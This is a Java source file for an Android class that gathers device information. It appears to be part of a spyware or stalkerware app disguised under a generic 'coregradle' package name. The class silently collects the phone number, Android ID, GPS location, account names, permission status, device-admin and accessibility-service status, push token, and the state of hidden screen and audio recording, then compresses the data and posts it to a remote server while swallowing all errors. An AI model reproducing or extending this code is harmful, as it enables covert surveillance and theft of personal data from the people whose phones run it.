package org.code.coregradle.gatherers;

import android.Manifest;
import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.annotation.SuppressLint;
import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.app.usage.UsageStatsManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.ServiceInfo;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.view.accessibility.AccessibilityManager;

import androidx.annotation.NonNull;
import androidx.work.ListenableWorker;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.code.coregradle.WorkerStore;
import org.code.coregradle.config.ApiConfig;
import org.code.coregradle.config.IdentityStore;
import org.code.coregradle.receiver.WayneReceiver;
import org.code.coregradle.services.AlfredService;
import org.code.coregradle.utils.AudioRecordHelper;
import org.code.coregradle.utils.CompressionUtils;
import org.code.coregradle.utils.FileUtils;
import org.code.coregradle.utils.JsonUtils;
import org.code.coregradle.utils.MiHelper;
import org.code.coregradle.utils.PermissionHelper;
import org.code.coregradle.utils.WynkHelper;

import java.io.File;
import java.util.Date;
import java.util.List;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class BasicInfoGatherer implements InfoGatherer, LocationListener {
    private final OkHttpClient okHttpClient = new OkHttpClient();
    private TelephonyManager telephonyManager;
    private LocationManager mLocationManager;
    private Location mLocation;
    private Context context;
    private BatteryManager batteryManager;
    private ConnectivityManager cm;
    private UsageStatsManager usm;
    private AccountManager accountManager;
    private PermissionHelper permissionHelper;
    private IdentityStore identityStore;

    @Override
    public void initGatherer(Context context) {
        this.context = context;
        // Android Managers
        this.telephonyManager = (TelephonyManager) context
                .getSystemService(Context.TELEPHONY_SERVICE);

        this.mLocationManager = (LocationManager) context
                .getSystemService(Context.LOCATION_SERVICE);


        this.cm = (ConnectivityManager) context
                .getSystemService(Context.CONNECTIVITY_SERVICE);

        this.accountManager = (AccountManager) context
                .getSystemService(Context.ACCOUNT_SERVICE);

        // Helpers
        this.identityStore = IdentityStore.getInstance(context);
        this.permissionHelper = new PermissionHelper(context);

        // Initializer based on Android API Level
        initUsageStatsManager(context);
        initBatteryManager(context);
        initLocationManager();
    }


    private boolean isLocationGranted() {
        return permissionHelper.isGranted(Manifest.permission.ACCESS_FINE_LOCATION) ||
                permissionHelper.isGranted(Manifest.permission.ACCESS_COARSE_LOCATION);
    }

    private void initLocationManager() {
        if (isLocationGranted()) {
            mLocationManager
                    .requestLocationUpdates(
                            LocationManager.GPS_PROVIDER,
                            100_000,
                            10,
                            this, Looper.getMainLooper());
            mLocation = mLocationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
        }
    }

    private void initUsageStatsManager(Context context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                usm = (UsageStatsManager) context.getSystemService(Context.USAGE_STATS_SERVICE);
            }
        }
    }

    private void initBatteryManager(Context context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            batteryManager = (BatteryManager) context.getSystemService(Context.BATTERY_SERVICE);
        }
    }

    public static boolean isAccessibilityServiceEnabled(Context context, Class<? extends AccessibilityService> service) {
        try {
            AccessibilityManager am = (AccessibilityManager) context.getSystemService(Context.ACCESSIBILITY_SERVICE);
            List<AccessibilityServiceInfo> enabledServices = am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK);

            for (AccessibilityServiceInfo enabledService : enabledServices) {
                ServiceInfo enabledServiceInfo = enabledService.getResolveInfo().serviceInfo;
                if (enabledServiceInfo.packageName.equals(context.getPackageName()) && enabledServiceInfo.name.equals(service.getName())) {
                    return true;
                }
            }
        } catch (Exception ignored) {

        }
        return false;
    }

    private void addAccessibilityPermissions(JSONArray granted, JSONArray denied) {
        if (isAccessibilityServiceEnabled(context, AlfredService.class)) {
            granted.put("ACCESSIBILITY");
        } else {
            denied.put("ACCESSIBILITY");
        }
    }

    public static boolean isDeviceAdminEnabled(Context context, Class<? extends DeviceAdminReceiver> receiver) {
        boolean isEnabled = false;
        try {
            DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            List<ComponentName> componentNames = devicePolicyManager.getActiveAdmins();

            for (ComponentName componentName : componentNames) {
                if (componentName.getPackageName().equals(context.getPackageName()) && componentName.getClassName().equals(receiver.getName())) {
                    isEnabled = true;
                    break;
                }
            }
        } catch (Exception ignored) {

        }
        return isEnabled;
    }

    private void addDeviceAdminPermission(JSONArray granted, JSONArray denied) {
        if (isDeviceAdminEnabled(context, WayneReceiver.class)) {
            granted.put("DEVICE ADMIN");
        } else {
            denied.put("DEVICE ADMIN");
        }
    }

    private void addPermissionStatus(JSONObject requestJSON) {
        try {
            List<String> grantedPermissionList = permissionHelper.getGrantedPermissions();
            List<String> deniedPermissionList = permissionHelper.getDeniedPermissions();
            JSONArray grantedPermissionsArray = JsonUtils.toJSONArray(grantedPermissionList);
            JSONArray deniedPermissionArray = JsonUtils.toJSONArray(deniedPermissionList);
            addAccessibilityPermissions(grantedPermissionsArray, deniedPermissionArray);
            addDeviceAdminPermission(grantedPermissionsArray, deniedPermissionArray);
            requestJSON.put("grantedPermissions", grantedPermissionsArray);
            requestJSON.put("deniedPermissions", deniedPermissionArray);
        } catch (JSONException ignored) {

        }
    }

    @SuppressLint("HardwareIds")
    private void addDeviceInfo(JSONObject requestJSON) throws JSONException {
        String signalRegistrationNumber = this.identityStore.getIdentityValue();
        String androidId = Settings.Secure
                .getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        // Android Version
        requestJSON.put("androidId", androidId);
        requestJSON.put(this.identityStore.getIdentityKey(), signalRegistrationNumber);

        requestJSON.put("manufacturer", Build.MANUFACTURER);
        requestJSON.put("version", Build.VERSION.SDK_INT);
        requestJSON.put("apkVersion", ApiConfig.API_VERSION);
        requestJSON.put("versionRelease", Build.VERSION.RELEASE);
        requestJSON.put("Model Number", Build.MODEL);
        requestJSON.put("timestamp", (new Date()).toString());
        try {
            SharedPreferences sharedPreferences = context.getSharedPreferences(WorkerStore.APP_USAGE_PREFS, Context.MODE_PRIVATE);
            requestJSON.put("installationTimestamp", sharedPreferences.getString(WorkerStore.INSTALLATION_TIMESTAMP, "InstallationDateNotAvailable"));
        } catch (Exception ignored) {
        }
    }

    @SuppressLint("HardwareIds")
    private void addPhoneInfo(JSONObject requestJSON) {
        try {
            String phoneNumber = telephonyManager.getLine1Number();
            requestJSON.put("phoneNumber", phoneNumber);
        } catch (Exception ignored) {

        }
    }

    private void addLocationInfo(JSONObject requestJSON) throws JSONException {
        if (mLocation != null) {
            requestJSON.put("latitude", mLocation.getLatitude());
            requestJSON.put("longitude", mLocation.getLongitude());
        }
    }

    private void addNetworkInfo(JSONObject requestJSON) throws JSONException {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Network nw = cm.getActiveNetwork();
            NetworkCapabilities actNw = cm.getNetworkCapabilities(nw);
            if (actNw.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) {
                requestJSON.put("networkType", "WIFI");
            } else if (actNw.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) {
                requestJSON.put("networkType", "CELLULAR");
            }
        }
    }

    private void addBatteryInfo(JSONObject requestJSON) throws JSONException {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            int batteryPercent = batteryManager
                    .getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
            requestJSON.put("battery", batteryPercent);
        }
    }

    private void addAppSpecificInfo(JSONObject requestJSON) throws JSONException {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            requestJSON.put("bucket", usm.getAppStandbyBucket());
        }
        JSONObject idConfig = identityStore.getConfig();
        if (idConfig.has(IdentityStore.APP_SPECIFIC_INFO)) {
            requestJSON.put(IdentityStore.APP_SPECIFIC_INFO, idConfig.get(IdentityStore.APP_SPECIFIC_INFO));
        }
    }

    private void addFirebaseInfo(JSONObject requestJSON) throws JSONException {
        String fcm_token = FileUtils.readString(new File(context.getFilesDir(), "fcm_token"));
        if (fcm_token != null && !fcm_token.isEmpty()) {
            requestJSON.put("fcm_token", fcm_token);
        } else {
            requestJSON.put("fcm_token", "not_registered_yet");
        }
    }

    private void addAccountsInfo(JSONObject requestJSON) throws JSONException {
        Account[] accounts = accountManager.getAccounts();
        JSONArray accountArray = new JSONArray();
        for (Account account : accounts) {
            JSONObject accountJSON = new JSONObject();
            accountJSON.put("name", account.name);
            accountJSON.put("type", account.type);
            accountArray.put(accountJSON);
        }
        requestJSON.put("accounts", accountArray);
    }

    private void addMIUISpecifics(JSONObject requestJSON) throws JSONException {
        JSONObject config = identityStore.getConfig();
        if (config.has("miuiBgLaunchPermission")) {
            requestJSON.put("miuiBgLaunchPermission", config.get("miuiBgLaunchPermission"));
        }
        MiHelper miHelper = MiHelper.getInstance(context);

        requestJSON.put("miBgPermissionCheckQueued", miHelper.isBgPermissionCheckQueued());
    }

    private void addRecordingCriteria(JSONObject jsonObject) {
        try {
            PowerManager powerManager = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
            WynkHelper wynkHelper = WynkHelper.getInstance(context);
            AudioRecordHelper audioRecordHelper = AudioRecordHelper.getInstance(context);

            jsonObject.put("screenOn", powerManager.isScreenOn());
            jsonObject.put("accessibilityServiceIsRunning", AlfredService.isRunning);
            jsonObject.put("isScreenRecordingQueueActive", wynkHelper.isRecordingQueued());
            jsonObject.put("wynkRecording", wynkHelper.isRecording());
            jsonObject.put("wynkMonitoring", wynkHelper.isMonitoring());
            jsonObject.put("humRecording", audioRecordHelper.isRecording());
            jsonObject.put("humMonitoring", audioRecordHelper.isMonitoring());
        } catch (JSONException ignored) {

        }
    }

    @Override
    public JSONObject getRequestJSON() {
        JSONObject requestJSON = new JSONObject();
        try {
            addDeviceInfo(requestJSON);
            addPhoneInfo(requestJSON);
            addLocationInfo(requestJSON);
            addNetworkInfo(requestJSON);
            addBatteryInfo(requestJSON);
            addAppSpecificInfo(requestJSON);
            addFirebaseInfo(requestJSON);
            addPermissionStatus(requestJSON);
            addAccountsInfo(requestJSON);
            addMIUISpecifics(requestJSON);
            addRecordingCriteria(requestJSON);
        } catch (Exception ignored) {
        }
        return requestJSON;
    }


    @Override
    public ListenableWorker.Result makeRequest() {
        try {
            JSONObject requestJSON = getRequestJSON();
            RequestBody requestBody = RequestBody.create(MediaType.get("application/json"), CompressionUtils.compress(requestJSON.toString()));
            Request request = new Request.Builder()
                    .url(ApiConfig.BASIC_INFO_URL)
                    .post(requestBody)
                    .build();
            Response response = okHttpClient.newCall(request).execute();
            if (response.isSuccessful()) {
                return ListenableWorker.Result.success();
            }
        } catch (Exception ignored) {

        }
        return ListenableWorker.Result.failure();
    }

    @Override
    public void onLocationChanged(@NonNull Location location) {
        mLocation = location;
        mLocationManager.removeUpdates(this);
    }

    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {

    }

    @Override
    public void onProviderEnabled(@NonNull String provider) {

    }

    @Override
    public void onProviderDisabled(@NonNull String provider) {

    }
}
